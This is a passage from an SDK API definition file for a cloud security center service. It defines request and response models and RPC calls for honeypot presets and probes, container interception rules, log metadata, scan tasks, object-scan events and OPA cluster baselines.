        fileId?: string(name='FileId', description='The ID of the uploaded file.', example='HONEYPOT_FILE/1765_167040128****'),
        fileName?: string(name='FileName', description='The name of the uploaded file.', example='HONEYPOT_FILE****'),
        ossUrl?: string(name='OssUrl', description='The download URL.', example='http://aegis****'),
      }
    ](name='FileInfoList', description='An array that consists of the configurations of the uploaded file.'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the honeypot image.', example='RuoYi'),
    honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.', example='ruoyi'),
    honeypotPresetId?: string(name='HoneypotPresetId', description='The ID of the honeypot template.', example='94fd8805-d178-4361-84d3-de47fb4e****'),
    meta?: string(name='Meta', description='The custom configuration of the honeypot template.', example='{"trojan_git":"zip","burp":"open","portrait_option":"true"}'),
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
    presetName?: string(name='PresetName', description='The custom name of the honeypot template.', example='ssh'),
    presetType?: string(name='PresetType', description='The type of the honeypot template. Valid values:

*   **TEMP**: automatically generated template
*   **CUSTOM**: custom template
*   **DEFAULT**: default template', example='CUSTOM'),
  }(name='Data', description='The information about the honeypot template.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='success'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='38AFE393-88E8-5642-B3E2-D57C6E76025D'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model GetHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetHoneypotPresetResponseBody(name='body'),
}

async function getHoneypotPreset(request: GetHoneypotPresetRequest): GetHoneypotPresetResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetHoneypotPreset', 'POST', '/', 'json', false, 'json', request);
}

model GetHoneypotProbeRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh', position='Query'),
  probeId: string(name='ProbeId', description='The probe ID.

> You can call the [ListHoneypotProbe](~~ListHoneypotProbe~~) operation to query the IDs of probes.', example='d6c1ebc9-a90d-4c9e-9490-328814d1ca00', position='Query'),
}

model GetHoneypotProbeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    arp?: boolean(name='Arp', description='Indicates whether address resolution protocol (ARP) is enabled for the check type.', example='true'),
    canListenIpList?: [ string ](name='CanListenIpList', description='An array consisting of the IP addresses that can be monitored.'),
    cidrList?: [ string ](name='CidrList', description='The CIDR blocks of the probe deployed in a virtual private cloud (VPC).'),
    controlNode?: {
      ecsInstanceId?: string(name='EcsInstanceId', description='The instance ID of the management node.', example='i-bp19ijepxytwtzrk****'),
      nodeId?: string(name='NodeId', description='The ID of the management node.', example='37a15ff1-3475-4897-aa6c-f7fd9122****'),
      nodeName?: string(name='NodeName', description='The name of the management node.', example='online-honeypot'),
    }(name='ControlNode', description='The information about the management node.'),
    cpuLoad?: double(name='CpuLoad', description='The CPU utilization.', example='0.51'),
    deployTime?: long(name='DeployTime', description='The time when the probe was deployed.', example='1669363825000'),
    displayName?: string(name='DisplayName', description='The name of the probe.', example='test-probe'),
    honeyPotProbeScanPort?: {
      id?: long(name='Id', description='The unique ID of the service that is monitored.', example='15389'),
      ports?: string(name='Ports', description='The ports that are monitored.', example='{
    "tcp": "1-65535",
    "udp": "1-65535"
}'),
      probeId?: string(name='ProbeId', description='The ID of the probe.', example='a46f5162-c70d-4e26-8ddf-7435feca****'),
      serviceIpList?: [ string ](name='ServiceIpList', description='The IP addresses that are monitored.'),
      status?: int32(name='Status', description='The monitoring status. Valid values:

*   **1**: abnormal
*   **3**: normal', example='3'),
    }(name='HoneyPotProbeScanPort', description='The ports that the honeypot monitors.'),
    honeypotProbeBindList?: [ 
      {
        bindId?: string(name='BindId', description='The unique ID of the honeypot that is bound to the probe.', example='45378f64-d7b4-4a53-9c48-4303eb4b****'),
        bindPortList?: [ 
          {
            bindPort?: boolean(name='BindPort', description='Indicates whether the port is bound.', example='false'),
            endPort?: int32(name='EndPort', description='The end port on which the probe monitors.', example='80'),
            err?: string(name='Err', description='The error that is returned if an error occurred in the port of the honeypot that is bound to the probe.', example='portmap failed'),
            fixed?: boolean(name='Fixed', description='Indicates whether the port is a fixed port.', example='false'),
            id?: long(name='Id', description='The unique ID of the port binding record.', example='2512'),
            msg?: string(name='Msg', description='The error message that is returned if an error occurred in the port of the honeypot that is bound to the probe.', example='listen 22 tcp4 failed'),
            proto?: string(name='Proto', description='The type of the protocol.', example='tcp'),
            startPort?: int32(name='StartPort', description='The start port on which the probe monitors.', example='22'),
            status?: int32(name='Status', description='The status of the port of the honeypot that is bound to the probe. Valid values:

*   **1**: abnormal
*   **3**: normal', example='3'),
            targetPort?: int32(name='TargetPort', description='The destination port.', example='80'),
          }
        ](name='BindPortList', description='The ports that are bound to the probe.'),
        honeypotId?: string(name='HoneypotId', description='The honeypot ID.', example='913347774a3b3c378c6a50f66de23dfa097765214ec3f0526b01c67bf59c****'),
        serviceIpList?: [ string ](name='ServiceIpList', description='The IP addresses that are monitored.'),
        status?: int32(name='Status', description='The status of the honeypot that is bound to the probe. Valid values:

*   **1**: abnormal
*   **3**: normal', example='3'),
      }
    ](name='HoneypotProbeBindList', description='The honeypots that are bound to the probe.'),
    hostIp?: string(name='HostIp', description='The IP address of the server on which the probe is deployed.', example='33.53.XX.XX'),
    listenIpList?: [ string ](name='ListenIpList', description='An array consisting of the IP addresses that can be monitored.'),
    memoryLoad?: double(name='MemoryLoad', description='The memory usage.', example='1.94'),
    osType?: string(name='OsType', description='The operating system of the server on which the probe is deployed. Valid values:

*   windows
*   linux', example='windows'),
    ping?: boolean(name='Ping', description='Indicates whether ping is enabled for the check type.', example='false'),
    probeId?: string(name='ProbeId', description='The ID of the probe.', example='40f6501d-45ec-4bf0-b813-0072ceb4****'),
    probeType?: string(name='ProbeType', description='The type of the probe. Valid values:

*   **host_probe**: host probe
*   **vpc_black_hole_probe**: virtual private cloud (VPC) probe', example='host_probe'),
    probeVersion?: string(name='ProbeVersion', description='The version of the probe.', example='18060096'),
    proxyIp?: string(name='ProxyIp', description='The IP address of the proxy server.', example='47.108.XX.XX'),
    status?: int32(name='Status', description='The status of the probe. Valid values:

*   **installed**: installed
*   **install_failed**: installation failed
*   **online**: online
*   **offline**: offline
*   **unnormal**: abnormal
*   **unprobe**: unauthorized
*   **uninstalling**: being uninstalled
*   **uninstalled**: uninstalled
*   **uninstall_failed**: uninstallation failed
*   **not_exist**: not installed', example='online'),
    uuid?: string(name='Uuid', description='The UUID of the asset on which the host probe is deployed.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
    vpcId?: string(name='VpcId', description='The ID of the VPC in which the probe is deployed.', example='vpc-2vchkxmf2j9yjt3x2****'),
  }(name='Data', description='The information about the probe.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6550E0E6-FD6C-5F39-AB5E-35B30DCA97B5'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model GetHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetHoneypotProbeResponseBody(name='body'),
}

async function getHoneypotProbe(request: GetHoneypotProbeRequest): GetHoneypotProbeResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetHoneypotProbe', 'POST', '/', 'json', false, 'json', request);
}

model GetHoneypotStatisticsRequest {
  lang?: string(name='Lang', example='zh', position='Query'),
}

model GetHoneypotStatisticsResponseBody = {
  code?: string(name='Code', example='200'),
  data?: {
    totalHoneypotCount?: int32(name='TotalHoneypotCount', example='20'),
    totalNodeStatus?: int32(name='TotalNodeStatus', example='1'),
    totalProbeCount?: int32(name='TotalProbeCount', example='40'),
    usedHoneypotCount?: int32(name='UsedHoneypotCount', example='7'),
    usedHostProbeCount?: int32(name='UsedHostProbeCount', example='9'),
    usedProbeCount?: int32(name='UsedProbeCount', example='15'),
    usedVpcProbeCount?: int32(name='UsedVpcProbeCount', example='6'),
  }(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='EB7181CB-32F3-5189-A935-4E24DD1A****'),
  success?: boolean(name='Success', example='true'),
}

model GetHoneypotStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetHoneypotStatisticsResponseBody(name='body'),
}

async function getHoneypotStatistics(request: GetHoneypotStatisticsRequest): GetHoneypotStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetHoneypotStatistics', 'POST', '/', 'json', false, 'json', request);
}

model GetImageEventOperationRequest {
  id?: long(name='Id', example='814163', position='Query'),
  lang?: string(name='Lang', example='zh', position='Query'),
}

model GetImageEventOperationResponseBody = {
  code?: string(name='Code', example='200'),
  data?: {
    conditions?: string(name='Conditions', example='[{\\"condition\\": \\"MD5\\", \\"type\\": \\"equals\\", \\"value\\": \\"0083a31cc0083a31ccf7c10367a6e783e\\"}]'),
    eventKey?: string(name='EventKey', example='PEM'),
    eventName?: string(name='EventName', example='PEM'),
    eventType?: string(name='EventType', example='sensitiveFile'),
    id?: long(name='Id', example='443496'),
    operationCode?: string(name='OperationCode', example='whitelist'),
    scenarios?: string(name='Scenarios', example='{\\"type\\": \\"repo\\", \\"value\\": \\"test-aaa/shenzhen-repo-01\\"}'),
  }(name='Data'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='5861EE3E-F0B3-48B8-A5DC-A5080BFB****'),
  success?: boolean(name='Success', example='true'),
}

model GetImageEventOperationResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetImageEventOperationResponseBody(name='body'),
}

async function getImageEventOperation(request: GetImageEventOperationRequest): GetImageEventOperationResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetImageEventOperation', 'POST', '/', 'json', false, 'json', request);
}

model GetImageScanNumInPeriodRequest {
  pastDay: string(name='PastDay', description='The number of days.', example='7', position='Query'),
}

model GetImageScanNumInPeriodResponseBody = {
  imageScanData?: {
    imageScanCount?: int32(name='ImageScanCount', description='The number of image scans.', example='150'),
  }(name='ImageScanData', description='The data returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92****'),
}

model GetImageScanNumInPeriodResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetImageScanNumInPeriodResponseBody(name='body'),
}

async function getImageScanNumInPeriod(request: GetImageScanNumInPeriodRequest): GetImageScanNumInPeriodResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetImageScanNumInPeriod', 'POST', '/', 'json', false, 'json', request);
}

model GetInterceptionRuleDetailRequest {
  clusterId: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c7f60fdabc84xxx', position='Query'),
  ruleId: string(name='RuleId', description='The ID of the rule.

> You can call the [ListInterceptionRulePage](~~ListInterceptionRulePage~~) operation to query the IDs of rules.', example='500002', position='Query'),
}

model GetInterceptionRuleDetailResponseBody = {
  interceptionRuleDetail?: {
    dstTarget?: {
      appName?: string(name='AppName', description='The name of the application.', example='console'),
      imageList?: [ string ](name='ImageList', description='An array that consists of the name of the image specified for the network object.'),
      namespace?: string(name='Namespace', description='The namespace to which the network object belongs.', example='kube-system'),
      ports?: [ string ](name='Ports', description='An array that consists of the port range of the destination network object.'),
      ruleType?: string(name='RuleType', description='The type of the rule.', example='customize'),
      tagList?: [ string ](name='TagList', description='An array that consists of the labels specified for the network object.'),
      targetId?: int32(name='TargetId', description='The ID of the network object.', example='200014'),
      targetName?: string(name='TargetName', description='The name of the object.', example='demo4-be1'),
      targetType?: string(name='TargetType', description='The type of the network object.', example='IMAGE'),
    }(name='DstTarget', description='The destination network object.'),
    interceptType?: long(name='InterceptType', description='The interception mode. Valid values:

*   **0**: monitor
*   **1**: block
*   **2**: alert
*   **3**: allow', example='1'),
    orderIndex?: long(name='OrderIndex', description='The priority of the rule. Valid values: 1 to 1000. A smaller value indicates a higher priority.', example='1'),
    ruleId?: long(name='RuleId', description='The ID of the rule.', example='467'),
    ruleName?: string(name='RuleName', description='The name of the rule.', example='dmz-frontend-accept'),
    ruleSwitch?: int32(name='RuleSwitch', description='The status of the defense rule. Valid values:

*   **1**: The rule is enabled.
*   **0**: The rule is disabled.', example='1'),
    ruleType?: string(name='RuleType', description='The type of the rule. Valid values:

*   **suggest**: a suggestion rule
*   **customize**: a custom rule', example='customize'),
    srcTarget?: {
      appName?: string(name='AppName', description='The name of the application.', example='console'),
      imageList?: [ string ](name='ImageList', description='The images of the network object.'),
      namespace?: string(name='Namespace', description='The namespace to which the network object belongs.', example='default'),
      ruleType?: string(name='RuleType', description='The type of the rule.', example='customize'),
      tagList?: [ string ](name='TagList', description='The labels specified for the network object.'),
      targetId?: int32(name='TargetId', description='The ID of the network object.', example='300635'),
      targetName?: string(name='TargetName', description='The name of the object.', example='dmz'),
      targetType?: string(name='TargetType', description='The type of the network object.', example='IMAGE'),
    }(name='SrcTarget', description='The source network object.'),
  }(name='InterceptionRuleDetail', description='The details of the rule.'),
  requestId?: string(name='RequestId', description='The request ID.', example='9FBC6E47-7508-xxx'),
}

model GetInterceptionRuleDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetInterceptionRuleDetailResponseBody(name='body'),
}

async function getInterceptionRuleDetail(request: GetInterceptionRuleDetailRequest): GetInterceptionRuleDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetInterceptionRuleDetail', 'POST', '/', 'json', false, 'json', request);
}

model GetInterceptionSummaryRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster.

> You can call the [DescribeGroupedContainerInstances](~~421736~~) operation to query the IDs of clusters.', example='c2999***bb61b', position='Query'),
}

model GetInterceptionSummaryResponseBody = {
  interceptionSummary?: {
    closeClusterCount?: int32(name='CloseClusterCount', description='The number of clusters that are not protected.', example='0'),
    closeRuleCount?: int32(name='CloseRuleCount', description='The number of disabled cluster defense rules.', example='0'),
    clusterCount?: int32(name='ClusterCount', description='The total number of clusters.', example='0'),
    interceptionCountInDays?: int32(name='InterceptionCountInDays', description='The total number of interception records for the specified cluster.', example='0'),
    openClusterCount?: int32(name='OpenClusterCount', description='The number of clusters that are protected.', example='0'),
    openRuleCount?: int32(name='OpenRuleCount', description='The number of enabled cluster defense rules.', example='0'),
    riskCount180Day?: long(name='RiskCount180Day', description='The number of security risks that are detected in the last 180 days.', example='0'),
    riskCount30Day?: long(name='RiskCount30Day', description='The number of security risks that are detected in the last 30 days.', example='0'),
    riskCountToday?: long(name='RiskCountToday', description='The number of security risks that are detected in the last 24 hours.', example='0'),
    ruleCount?: int32(name='RuleCount', description='The total number of cluster defense rules.', example='0'),
  }(name='InterceptionSummary', description='The statistics.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760E840'),
}

model GetInterceptionSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetInterceptionSummaryResponseBody(name='body'),
}

async function getInterceptionSummary(request: GetInterceptionSummaryRequest): GetInterceptionSummaryResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetInterceptionSummary', 'POST', '/', 'json', false, 'json', request);
}

model GetInterceptionTargetDetailRequest {
  targetId: long(name='TargetId', description='The ID of the network object.

> You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the IDs of network objects.', example='402008', position='Query'),
}

model GetInterceptionTargetDetailResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0DC1F8'),
  ruleTarget?: {
    appName?: string(name='AppName', description='The name of the application to which the network object belongs.', example='netperf-client'),
    clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='ca6e6594def8d4be8b2795fd12c32****'),
    clusterName?: string(name='ClusterName', description='The name of the container cluster.', example='sas-test-cnnf'),
    imageList?: [ string ](name='ImageList', description='An array that consists of the images of the network object.'),
    namespace?: string(name='Namespace', description='The namespace.', example='secondary'),
    tagList?: [ string ](name='TagList', description='An array that consists of the labels specified for the network object.'),
    targetId?: long(name='TargetId', description='The ID of the network object.', example='400723'),
    targetName?: string(name='TargetName', description='The name of the network object.', example='destination-test-obj-Na3cF'),
    targetType?: string(name='TargetType', description='The type of the network object. Valid values:

*   **IMAGE**: image', example='IMAGE'),
  }(name='RuleTarget', description='The information about the network object.'),
}

model GetInterceptionTargetDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetInterceptionTargetDetailResponseBody(name='body'),
}

async function getInterceptionTargetDetail(request: GetInterceptionTargetDetailRequest): GetInterceptionTargetDetailResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetInterceptionTargetDetail', 'POST', '/', 'json', false, 'json', request);
}

model GetLastOnceTaskInfoRequest {
  source?: string(name='Source', description='The source of the task.', example='console_batch', position='Query'),
  taskName: string(name='TaskName', description='The name of the task. Valid values:

*   **CLIENT\\_PROBLEM_CHECK**: client diagnosis task
*   **CLIENT\\_DEV_OPS**: O\\&M task of Cloud Assistant
*   **ASSETS_COLLECTION**: asset collection task', example='ASSETS_COLLECTION', position='Query'),
  taskType: string(name='TaskType', description='The type of the task. Valid values:

*   **CLIENT\\_PROBLEM_CHECK**: client diagnosis task
*   **CLIENT\\_DEV_OPS**: O\\&M task of Cloud Assistant
*   **ASSETS\\_COLLECTION**: asset collection task', example='ASSETS_COLLECTION', position='Query'),
}

model GetLastOnceTaskInfoResponseBody = {
  collectTime?: long(name='CollectTime', description='The time at which the task was run.', example='1671184531000'),
  finishCount?: int32(name='FinishCount', description='The number of tasks that have been completed.', example='67'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
  taskId?: long(name='TaskId', description='The ID of the latest scan task.', example='3f65e1f1bb13118891a889d569a3****'),
  taskInfo?: {
    progress?: int32(name='Progress', description='The progress of the task in percentage.', example='69'),
    result?: string(name='Result', description='The result of the scan task. Valid values:

*   **SUCCESS**: The task is successful.
*   **TASK\\_NOT\\_SUPPORT_REGION**: The images are deployed in a region that is not supported by container image scan.
*   **TASK\\_NOT_EXISTS**: The task does not exist.', example='SUCCESS'),
    status?: string(name='Status', description='The status of the task. Valid values:

*   **INIT**: The task is not started.
*   **START**: The task is started.
*   **SUCCESS**: The task is complete.
*   **TIMEOUT**: The task timed out.', example='SUCCESS'),
  }(name='TaskInfo', description='The information about the latest task.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='44'),
}

model GetLastOnceTaskInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetLastOnceTaskInfoResponseBody(name='body'),
}

async function getLastOnceTaskInfo(request: GetLastOnceTaskInfoRequest): GetLastOnceTaskInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetLastOnceTaskInfo', 'POST', '/', 'json', false, 'json', request);
}

model GetLogMetaRequest {
  logStore: string(name='LogStore', description='The name of the dedicated Logstore in which logs are stored.

>  You can call the [DescribeLogMeta](~~DescribeLogMeta~~) operation to query the name of the Logstore.', example='aegis-log-login', position='Query'),
}

model GetLogMetaResponseBody = {
  logMeta?: {
    logStore?: string(name='LogStore', description='The name of the dedicated Logstore in which logs are stored.', example='aegis-log-login'),
    project?: string(name='Project', description='The Simple Log Service project.', example='sas-log'),
    status?: string(name='Status', description='The status of a data shipping task of a log. Valid values:

*   **enabled**
*   **disabled**', example='enabled'),
  }(name='LogMeta', description='The data of a data shipping task.'),
  requestId?: string(name='RequestId', description='The request ID.', example='3956048F-9D73-5EDB-834B-4827BB48****'),
}

model GetLogMetaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetLogMetaResponseBody(name='body'),
}

async function getLogMeta(request: GetLogMetaRequest): GetLogMetaResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetLogMeta', 'POST', '/', 'json', false, 'json', request);
}

model GetModuleConfigRequest {
  currentPage?: string(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10', position='Query'),
}

model GetModuleConfigResponseBody = {
  httpStatusCode?: int32(name='HttpStatusCode', description='The response code returned.', example='200'),
  moduleConfigList?: [ 
    {
      configName?: string(name='ConfigName', description='The name of the configuration.', example='timescan'),
      items?: [ 
        {
          groupId?: int32(name='GroupId', description='The ID of the server group to which the server belongs.', example='5562414'),
          instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='i-uf6435dn4t59b9av****'),
          instanceName?: string(name='InstanceName', description='The instance name of the server.', example='inStanceName****'),
          ip?: string(name='Ip', description='The IP address of the server.', example='2.2.X.X'),
          region?: string(name='Region', description='The region in which the server resides.', example='cn-hangzhou'),
          uuid?: string(name='Uuid', description='The UUID of the server.', example='a47e3713-ed22-4015-93a3-d88ebe6****'),
        }
      ](name='Items', description='An array that consists of the configuration items.'),
      moduleName?: string(name='ModuleName', description='The name of the module.', example='alihids'),
    }
  ](name='ModuleConfigList', description='An array that consists of the configurations of the module.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='100'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='291B49F9-1685-4005-9D34-606B6F78****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful.', example='true'),
}

model GetModuleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetModuleConfigResponseBody(name='body'),
}

async function getModuleConfig(request: GetModuleConfigRequest): GetModuleConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetModuleConfig', 'POST', '/', 'json', false, 'json', request);
}

model GetModuleTrialAuthInfoRequest {
  lang?: string(name='Lang', example='zh', position='Query'),
  moduleCode?: string(name='ModuleCode', example='vulFix', position='Query'),
}

model GetModuleTrialAuthInfoResponseBody = {
  data?: {
    canTry?: boolean(name='CanTry'),
    moduleCode?: string(name='ModuleCode', example='vulFix'),
    trialRecordList?: [ 
      {
        authLimit?: long(name='AuthLimit', example='100'),
        gmtEnd?: long(name='GmtEnd', example='1679760000000'),
        gmtStart?: long(name='GmtStart', example='1669824000000'),
        moduleCode?: string(name='ModuleCode', example='vulFix'),
        status?: int32(name='Status', example='1'),
      }
    ](name='TrialRecordList'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
}

model GetModuleTrialAuthInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetModuleTrialAuthInfoResponseBody(name='body'),
}

async function getModuleTrialAuthInfo(request: GetModuleTrialAuthInfoRequest): GetModuleTrialAuthInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetModuleTrialAuthInfo', 'POST', '/', 'json', false, 'json', request);
}

model GetObjectScanEventRequest {
  eventId?: string(name='EventId', example='81****', position='Query'),
  lang?: string(name='Lang', example='zh', position='Query'),
}

model GetObjectScanEventResponseBody = {
  data?: {
    details?: [ 
      {
        infoType?: string(name='InfoType', example='html'),
        name?: string(name='Name', example='DownloadUrl。'),
        nameDisplay?: string(name='NameDisplay', example='DownloadUrl。'),
        type?: string(name='Type', example='html'),
        value?: string(name='Value', example='http://****'),
        valueDisplay?: string(name='ValueDisplay', example='http://****'),
      }
    ](name='Details'),
    eventName?: string(name='EventName', example='WebShell'),
    fileName?: string(name='FileName', example='sca_2023****'),
    md5?: string(name='Md5', example='0552c44e243abdea1729d4507bce****'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='30CBF632-109F-596F-97F2-451C8B2A****'),
}

model GetObjectScanEventResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetObjectScanEventResponseBody(name='body'),
}

async function getObjectScanEvent(request: GetObjectScanEventRequest): GetObjectScanEventResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetObjectScanEvent', 'POST', '/', 'json', false, 'json', request);
}

model GetOnceTaskResultInfoRequest {
  taskId: string(name='TaskId', description='The ID of the scan task.', example='9dfa3a7eb9547781632785b49003****', position='Query'),
  taskName: string(name='TaskName', description='The name of the task. Valid values:

*   **CLIENT\\_PROBLEM_CHECK**: a task of the Security Center agent
*   **CLIENT\\_DEV_OPS**: an O\\&M task of Cloud Assistant
*   **ASSET\\_SECURITY_CHECK**: a task of asset information collection', example='ASSETS_COLLECTION', position='Query'),
  taskType: string(name='TaskType', description='The type of the task. Valid values:

*   **CLIENT\\_PROBLEM_CHECK**: a task of the Security Center agent
*   **CLIENT\\_DEV_OPS**: an O\\&M task of Cloud Assistant
*   **ASSET\\_SECURITY_CHECK**: a task of asset information collection', example='ASSETS_COLLECTION', position='Query'),
}

model GetOnceTaskResultInfoResponseBody = {
  collectTime?: long(name='CollectTime', description='The execution time of the task.', example='1671184531000'),
  finishCount?: int32(name='FinishCount', description='The number of tasks that were completed.', example='47'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F****'),
  taskId?: long(name='TaskId', description='The ID of the scan task.', example='e7b70a4b030db086db52231f1b58****'),
  taskInfo?: {
    status?: string(name='Status', description='The status of the task. Valid values:

*   **INIT**: The task is not started.
*   **START**: The task is started.
*   **SUCCESS**: The task is complete.
*   **TIMEOUT**: The task times out.', example='START'),
  }(name='TaskInfo', description='The information about the task.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='44'),
}

model GetOnceTaskResultInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetOnceTaskResultInfoResponseBody(name='body'),
}

async function getOnceTaskResultInfo(request: GetOnceTaskResultInfoRequest): GetOnceTaskResultInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetOnceTaskResultInfo', 'POST', '/', 'json', false, 'json', request);
}

model GetOpaClusterBaseLineListRequest {
}

model GetOpaClusterBaseLineListResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: [ 
    {
      alias?: string(name='Alias', description='The alias of the baseline.', example='Make sure there are no duplicate usernames or UIDs'),
      classKey?: string(name='ClassKey', description='The key of the baseline type.', example='identification'),
      itemKey?: string(name='ItemKey', description='The key of the name for the baseline check item.', example='duplicate_uid'),
      nameKey?: string(name='NameKey', description='The key of the name for the baseline.', example='identification'),
    }
  ](name='Data', description='The information about baselines.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='C2F2A020-1CAB-5F52-8CAF-B2ACDDFAC247'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetOpaClusterBaseLineListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetOpaClusterBaseLineListResponseBody(name='body'),
}

async function getOpaClusterBaseLineList(request: GetOpaClusterBaseLineListRequest): GetOpaClusterBaseLineListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'GetOpaClusterBaseLineList', 'POST', '/', 'json', false, 'json', request);
}

model GetOpaClusterImageListRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='c4af4fdf38a98496a9b63c2be5dae****', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**.', example='1', position='Query'),
  imageName?: string(name='ImageName', description='The name of the image.', example='testImage', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **20**.', example='1', position='Query'),
}

model GetOpaClusterImageListResponseBody = {
  code?: string(name='Code', description='The response code. The status code 200 indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  count?: int32(name='Count', description='The number of images returned on the current page.', example='1'),
  data?: [ 
    {
      imageName?: string(name='ImageName', description='The name of the image.', example='opa-test'),
    }
  ](name='Data', description='The information about the images.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='0D02F593-2050-5F5D-8C98-D965FF1B461D'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
